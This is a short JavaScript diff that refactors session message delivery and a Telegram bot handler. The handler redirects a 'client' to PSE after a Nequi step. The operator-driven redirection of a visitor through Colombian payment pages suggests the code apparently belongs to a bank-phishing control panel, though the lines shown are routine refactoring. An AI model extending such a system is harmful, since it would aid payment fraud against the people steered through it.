@@ -547,16 +547,15 @@ function deliverToSession(sessionId, event, payload, fromCluster = false) {
     const liveCount = emitToSessionSockets(sessionId, event, enriched);
     if (!liveCount) {
         console.warn(`📥 Acción encolada (${event}) para ${sessionId} — sin socket activo`);
-        schedulePendingRetries(sessionId);
-    } else {
-        schedulePendingRetries(sessionId);
     }
+    schedulePendingRetries(sessionId);
 
     if (!fromCluster && cluster.isWorker && typeof process.send === 'function') {
         try {
             process.send({ type: 'socket-deliver', sessionId, event, payload: enriched });
         } catch (_) { /* ignore */ }
     }
+    return liveCount;
 }
 
 function sessionHasLiveSocket(sessionId) {
@@ -1169,16 +1168,14 @@ async function handleCallbackQuery(callbackQuery) {
         // Manejadores especiales para Nequi y PSE
         if (module === 'nequi' && action === 'follow') {
             const bank = session?.data?.bank;
-            const bankRoute = getBankRoute(bank);
-            const destLabel = bankRoute ? bank : 'PSE';
-            await bot.sendMessage(chatId, `\u2705 Cliente redirigido a ${destLabel}`, { reply_to_message_id: messageId });
-            deliverToSession(sessionId, 'actionFollow', {
+            await bot.sendMessage(chatId, '\u2705 Cliente redirigido a PSE', { reply_to_message_id: messageId });
+            const delivered = deliverToSession(sessionId, 'actionFollow', {
                 sessionId,
                 action: 'follow',
                 nextPage: 'pse',
-                bank,
-                bankRoute
+                bank
             });
+            console.log(`📤 actionFollow → ${sessionId} (sockets=${findSocketsForSession(sessionId).size})`);
             await bot.answerCallbackQuery(callbackId, { text: '\u2705 Continuar a PSE' });
             return;
         } else if (module === 'nequi' && action === 'reject') {
